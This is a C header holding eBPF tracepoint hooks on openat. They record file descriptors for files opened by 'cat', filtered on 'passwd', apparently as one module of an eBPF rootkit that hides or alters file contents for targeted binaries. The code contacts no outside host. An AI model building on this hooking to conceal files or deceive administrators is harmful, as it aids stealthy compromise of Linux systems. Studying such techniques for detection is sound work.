/**
 * Hooking openat for storing fd of potiential target files.
 * 
 * NOTE : I'm making a check also only on "cat" binary since it's the only one i'm focuing for openat & read.
 * The main problem for the current stands in the hide_cache_bin map containing bins such as 'bash' making a lot of requests...
 * 
 * ex : 
 * [DBG][tp_sys_enter_openat] Filename for open : /usr/lib/locale/en_US.utf8/LC_MONETARY from caller : bash
 * [DBG][tp_sys_enter_openat] Filename for open : /usr/lib/locale/en_US.UTF-8/LC_COLLATE from caller : bash
 * [DBG][tp_sys_enter_openat] Filename for open : /usr/lib/locale/en_US.utf8/LC_COLLATE from caller : bash
 * [DBG][tp_sys_enter_openat] Filename for open : /usr/lib/locale/en_US.UTF-8/LC_TIME from caller : bash
 * [DBG][tp_sys_enter_openat] Filename for open : /usr/lib/locale/en_US.utf8/LC_TIME from caller : bash
 * [DBG][tp_sys_enter_openat] Filename for open : /usr/lib/locale/en_US.UTF-8/LC_NUMERIC from caller : bash
 * [DBG][tp_sys_enter_openat] Filename for open : /usr/lib/locale/en_US.utf8/LC_NUMERIC from caller : bash
 * [DBG][tp_sys_enter_openat] Filename for open : /usr/lib/locale/en_US.UTF-8/LC_CTYPE from caller : bash
 * [DBG][tp_sys_enter_openat] Filename for open : /usr/lib/locale/en_US.utf8/LC_CTYPE from caller : bash
 * 
 * only focusing on CAT for the sake of simplicity...
 */

#ifndef MOD_HOOK_OPEN_H
#define MOD_HOOK_OPEN_H

#include "../includes/bpf_config.h"
#include "../includes/bpf_common.h"
#include "../includes/bpf_structs.h"
#include "../includes/bpf_debug.h"
#include "../includes/bpf_events_handler.h"
#include "../data/bpf_events.h"
#include "../data/bpf_ringbuf.h"
#include "../lib/ftlib.h"

/**
 * Hook sys_entry_openat
 * 
 */
SEC("tp/syscalls/sys_enter_openat")
int tp_sys_enter_openat(struct sys_enter_openat_ctx *ctx)
{
    if(!ctx)
        return 0;

    if(!ctx->filename)
        return 0;

    if(!__is_target_bin() || !__is_binary_cat())
        return 0;

    char filename[MAX_PATH] = {0};
    if(bpf_probe_read_user_str(filename, sizeof(filename), ctx->filename) < 0)
        return 0; //silence.

    //only keep passwd for testing.
    if(ft_strstr(filename, "passwd") == NULL)
        return 0;

    bpf_printk("------");
    PRINT_DEBUG("Filename for open : %s from cat command", filename);
    //[DBG][tp_sys_enter_openat] Filename for open : /etc/passwd from caller : cat

    __u64 key = bpf_get_current_pid_tgid(); //64 bits value returned.


    //storing infos.
    bpf_map_update_elem(&openat_cache, &key, filename, BPF_ANY);
    PRINT_DEBUG("Stored new cache value for : key => %ld & value => %s", key, filename);

    return 0;
}

/**
 * Hook sys_exit_openat
 */
SEC("tp/syscalls/sys_exit_openat")
int tp_sys_exit_openat(struct sys_exit_openat_ctx *ctx)
{
    if(!ctx)
        return 0;

    if(ctx->ret <= 0)
        return 0;

    __u64 fd = ctx->ret;
    __u64 pid_tgid = bpf_get_current_pid_tgid(); //64 bits value returned.

    //check map value.
    char* target = bpf_map_lookup_elem(&openat_cache, &pid_tgid);
    if(!target)
        return 0;

    char target_val[MAX_PATH] = {0};
    if(bpf_probe_read_kernel_str(target_val, sizeof(target_val), target) < 0){
        PRINT_DEBUG("Error retrieving value from map cache.");
        return 0;
    }

    //generate unique key.
    struct fd_key fd_cache_key = {
        .fd = fd,
        .pid_tgid = pid_tgid
    };

    bpf_map_update_elem(&fd_to_path_cache, &fd_cache_key, target_val, BPF_ANY);
    PRINT_DEBUG(" Successfully stored fd_key for : fd => %ld & pid_tgid (key) => %ld & filename => %s", fd, pid_tgid, target_val);
    
    //clean.
    bpf_map_delete_elem(&openat_cache, &pid_tgid);
    return 0;
}

#endif